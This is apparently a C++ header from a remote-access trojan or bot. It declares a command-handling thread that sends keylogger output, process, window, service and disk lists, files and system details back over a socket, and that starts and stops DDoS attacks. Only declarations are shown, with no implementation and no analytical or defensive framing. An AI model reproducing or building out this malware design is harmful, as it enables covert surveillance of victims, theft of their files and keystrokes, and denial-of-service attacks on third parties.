#pragma once
#include "threadex.h"
class CDealCMDThread :
	public CThreadEx
{
public:
	CDealCMDThread(HWND hWndMsg,int* pWndMain,SOCKET hSocket,CString strClientIP);
	~CDealCMDThread(void);

	BOOL				Command_SendSystemInfo();
	BOOL				Command_ReqCMDStatus(BOOL bSuccess = TRUE);
protected:
	int					Run();
	int					ExitInstance();
	BOOL				InitInstance();
	BOOL				ParseCMD(NM_CMD_S emCMD);
	
	BOOL				Command_SendKeyLog();		
	BOOL				Command_SendProcessList();
	BOOL				Command_SendDiskDriveInfo();
	BOOL				Command_SendPathFile(CString strPath);
	BOOL				Command_SendWindowsList();
	BOOL				Command_SendServiceList();

	BOOL				SendBufToClient(BYTE* pData, DWORD dwData);
	BOOL				SOKCET_Select(SOCKET hSocket,int nTimeOut,BOOL bWrite);
	BOOL				SendMsgToClient(NM_CMD_S* pNMCmd,LONG lCmd);		
	BOOL				FillSystemInfo(SYSTEM_INFO_S &emSysInfo_s);
	CString				GetDiskVolume(CString strDiskDriveName);
		
	void				DealDDOSStop();
	BOOL				DealDDOSStart(DDOS_INFO_S emDDOS);

private:
	HWND				m_hWndMsg;
	int*				m_pWndMain;

	CString				m_strClientIP;
	SOCKET				m_hSocketClient;				// 连接客户端SOCKET	
	BOOL				m_bSafeExit;
	BOOL				m_bThreadRolling;
};

